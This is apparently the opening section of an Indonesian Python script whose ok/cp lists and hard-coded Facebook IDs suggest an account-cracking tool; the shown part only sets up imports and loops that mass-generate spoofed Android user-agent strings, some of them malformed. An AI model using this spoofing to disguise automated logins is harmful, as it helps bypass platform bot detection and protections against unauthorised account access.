# Coding By Kalldev & TamsisSlebew
# Di Buat (selasa,30-mei,2023)

# Kalo Mau Nyomot Jangan Lupain Nama Author Ya :v

#> MODULE UTAMA
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from bs4 import BeautifulSoup as parse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

#> MODULE RICH
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel
from rich.tree import Tree
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns

# > COLOR PRINT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA

#> COLOR RICH
M1 = '[color(9)]' # MERAH
H1 = '[color(10)]' # HIJAU
K1 = '[color(11)]' # KUNING
P1 = '[color(15)]' # putih
X1 = str(random.choice([P1,H1,K1,M1]))

#> CONVERTER BULAN
wulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = str(datetime.now().day)
bulan = wulan[str(datetime.now().month)]
tahun = str(datetime.now().year)
yuzong = tanggal+'-'+bulan+'-'+tahun

#> INDICATION
loop,ugen = 0,[]
uid,uid2 = [],[]
ok, cp = [],[]
data, data2 = {}, {}
wadok,ugen2 = [],[]
ugent = []
usam = []
uak = []
uakuh = []
usragent = []
uaku2 = []
ses = requests.Session()
mysosmed = ["100023442491781",'100013275378835','100063837653547','100073125893802']
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga)
	
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X653C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)80.0.4758.60 Version/4.0 Linux/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3 '
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Nokia_X'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.2.0.58.129;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0. 0.29.105;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=(['S88Plus'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
	uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	usragent.append(uakuh)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J610F'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(80,106)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-A51 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12 .108;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SGP712'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 [FB_IAB/FB4A;FBAV/351.0 .0.38.117;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['S98Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24. 77;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-gb; CPH1909'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 HeyTapBrowser/7.4.2beta'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-A750G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/13.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	Denventa_Af1=f'Mozilla/5.0 (Linux; Android {a}; CPH2109 Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	Denventa_Af2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	Denventa_Af3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	Denventa_Af4=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([Denventa_Af1,Denventa_Af2,Denventa_Af3,Denventa_Af4])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	
for xd in range(10000):
	a='Mozilla/5.0 (Java; U; en-us; samsung-gt-s3850) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB Mobile UNTRUSTED/1.0'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='en-us;'
	e=random.randrange(100, 9999)
	f='AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile UNTRUSTED/1.0'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
